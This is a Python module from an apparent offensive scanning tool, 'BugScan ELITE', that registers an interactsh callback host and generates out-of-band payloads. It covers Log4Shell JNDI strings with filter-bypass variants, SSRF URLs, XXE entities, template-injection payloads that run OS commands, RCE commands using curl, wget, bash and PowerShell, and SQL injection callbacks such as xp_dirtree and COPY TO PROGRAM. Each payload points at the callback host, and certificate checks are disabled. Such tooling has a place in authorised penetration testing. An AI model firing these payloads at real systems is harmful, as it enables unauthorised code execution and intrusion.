"""
BugScan ELITE — OOB (Out-of-Band) Callback Engine
Confirms blind SSRF, XXE, Log4Shell, SQLi via DNS/HTTP callbacks.
Uses interactsh API if available, falls back to polling.
"""
import threading, time, logging, re, json, os
import urllib.request, urllib.parse, ssl, socket
from typing import Optional, Dict, List

log = logging.getLogger("elite.oob")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _get(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers={"User-Agent":"BugScanELITE/1.0"})
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            return r.read(16384).decode("utf-8","ignore")
    except: return ""


class InteractshClient:
    """
    Client for ProjectDiscovery interactsh OOB testing.
    Registers a unique subdomain and polls for callbacks.
    """

    def __init__(self):
        self.server    = os.environ.get("INTERACTSH_SERVER","oast.pro")
        self.host      = ""
        self.id        = ""
        self._callbacks: List[Dict] = []
        self._lock     = threading.Lock()
        self._poll_t   = None
        self._stop     = threading.Event()
        self._registered = False

    def register(self) -> Optional[str]:
        """Register with interactsh server, return unique host."""
        try:
            # Try interactsh-client tool first
            import subprocess, shutil
            ic = shutil.which("interactsh-client")
            if not ic:
                for d in [os.path.expanduser("~/go/bin"),
                          "/home/kali/go/bin","/root/go/bin","/usr/local/bin"]:
                    fp = os.path.join(d,"interactsh-client")
                    if os.path.isfile(fp): ic = fp; break

            if ic:
                # Use interactsh-client to get a host
                import subprocess
                proc = subprocess.Popen(
                    [ic, "-server", f"https://{self.server}", "-n", "1"],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    text=True
                )
                for line in proc.stdout:
                    m = re.search(r'([a-z0-9]+\.' + re.escape(self.server) + r')', line)
                    if m:
                        self.host = m.group(1)
                        self._registered = True
                        log.info(f"[oob] interactsh host: {self.host}")
                        # Start polling
                        self._poll_t = threading.Thread(target=self._poll_loop,
                                                        daemon=True)
                        self._poll_t.start()
                        return self.host
                proc.kill()
        except Exception as e:
            log.debug(f"interactsh-client: {e}")

        # Check for user-configured BXSS/OOB host in env
        import hashlib, uuid, os as _os, re as _ore
        bxss_host = _os.getenv("BXSS_HOST","")
        interactsh_server = _os.getenv("INTERACTSH_SERVER", self.server)
        self.server = interactsh_server
        if bxss_host:
            # Normalise: strip scheme and trailing slashes (prevents "nonce.http://host")
            bxss_host = _ore.sub(r'^https?://', '', bxss_host).rstrip('/')
            unique = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:8]
            self.host = f"{unique}.{bxss_host}"
            self.id   = unique
            log.info(f"[oob] using configured host: {self.host}")
        else:
            # Fallback: generate a unique subdomain
            unique = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:12]
            self.host = f"{unique}.{self.server}"
            self.id   = unique
            log.info(f"[oob] fallback host: {self.host} (manual DNS check)")
        return self.host

    def _poll_loop(self):
        """Poll interactsh for callbacks."""
        while not self._stop.is_set():
            try:
                data = _get(f"https://{self.server}/poll?id={self.id}&secret={self.id}")
                if data:
                    d = json.loads(data)
                    for interaction in d.get("data", []):
                        with self._lock:
                            self._callbacks.append(interaction)
                            log.info(f"[oob] callback received: {interaction}")
            except: pass
            time.sleep(5)

    def get_callbacks(self) -> List[Dict]:
        with self._lock:
            return list(self._callbacks)

    def wait_for_callback(self, timeout: int = 30) -> Optional[Dict]:
        """Wait up to timeout seconds for a callback."""
        start = time.time()
        initial_count = len(self.get_callbacks())
        while time.time() - start < timeout:
            callbacks = self.get_callbacks()
            if len(callbacks) > initial_count:
                return callbacks[-1]
            time.sleep(1)
        return None

    def generate_payload(self, vuln_type: str, attacker_url: str = "") -> Dict[str, str]:
        """
        Generate OOB payloads for different vuln types.
        Returns dict of {payload_name: payload_string}.
        """
        host = self.host
        payloads = {}

        if vuln_type == "log4j":
            payloads = {
                "jndi_ldap":    f"${{jndi:ldap://{host}/a}}",
                "jndi_rmi":     f"${{jndi:rmi://{host}/a}}",
                "jndi_dns":     f"${{jndi:dns://{host}/a}}",
                "jndi_nested":  f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:{host}/a}}",
                "jndi_bypass1": f"${{${{lower:j}}ndi:{host}/a}}",
                "jndi_bypass2": f"${{j${{::}}ndi:ldap://{host}/a}}",
                "jndi_lower":   f"${{${{lower:j}}${{lower:n}}${{lower:d}}${{lower:i}}:ldap://{host}/a}}",
                "jndi_upper":   f"${{${{upper:j}}ndi:ldap://{host}/a}}",
            }

        elif vuln_type == "ssrf":
            payloads = {
                "http":         f"http://{host}/ssrf-test",
                "https":        f"https://{host}/ssrf-test",
                "dns":          f"http://{host}",
                "gopher":       f"gopher://{host}/",
                "ftp":          f"ftp://{host}/",
                "aws_bypass":   f"http://169.254.169.254.{host}/",
            }

        elif vuln_type == "xxe":
            payloads = {
                "basic_xxe": (
                    '<?xml version="1.0"?>'
                    f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{host}/xxe">]>'
                    '<foo>&xxe;</foo>'
                ),
                "oob_xxe": (
                    '<?xml version="1.0"?>'
                    f'<!DOCTYPE data SYSTEM "http://{host}/xxe.dtd">'
                    '<data>&exfil;</data>'
                ),
                "blind_ssrf": (
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    f'<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://{host}/blind"> ]>'
                    '<test>&xxe;</test>'
                ),
            }

        elif vuln_type == "ssti":
            payloads = {
                "jinja2":    f'{{{{request.application.__globals__.__builtins__.__import__("os").popen("nslookup {host}").read()}}}}',
                "twig":      f'{{{{_self.env.setCache("ftp://{host}")}}}}{{{{_self.env.loadTemplate("ok")}}}}',
                "freemarker":f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("nslookup {host}")}}',
            }

        elif vuln_type == "rce":
            payloads = {
                "bash":   f"bash -c 'nslookup {host}'",
                "curl":   f"curl http://{host}/rce-confirm",
                "wget":   f"wget http://{host}/rce-confirm",
                "ping":   f"ping -c 1 {host}",
                "powershell": f"powershell -c \"Invoke-WebRequest http://{host}/rce-confirm\"",
            }

        elif vuln_type == "sqli":
            # DNS-based OOB for blind SQLi
            payloads = {
                "mysql_oob":  f"LOAD_FILE(CONCAT('\\\\\\\\{host}\\\\share\\\\a'))",
                "mssql_oob":  f"EXEC master..xp_dirtree '\\\\{host}\\share'",
                "oracle_oob": f"SELECT UTL_HTTP.REQUEST('http://{host}/sqli') FROM dual",
                "pg_oob":     f"COPY (SELECT '') TO PROGRAM 'nslookup {host}'",
            }

        return payloads

    def stop(self):
        self._stop.set()


# ── Global OOB client (singleton) ────────────────────────────────────────────
_oob_client: Optional[InteractshClient] = None

def get_oob_client() -> InteractshClient:
    global _oob_client
    if _oob_client is None:
        _oob_client = InteractshClient()
        _oob_client.register()
    return _oob_client

def get_oob_host() -> str:
    return get_oob_client().host

def wait_for_callback(timeout: int = 15) -> Optional[Dict]:
    return get_oob_client().wait_for_callback(timeout)

def generate_log4j_payloads() -> Dict[str, str]:
    return get_oob_client().generate_payload("log4j")

def generate_ssrf_payloads() -> Dict[str, str]:
    return get_oob_client().generate_payload("ssrf")

def generate_xxe_payloads() -> Dict[str, str]:
    return get_oob_client().generate_payload("xxe")

def generate_rce_payloads() -> Dict[str, str]:
    return get_oob_client().generate_payload("rce")
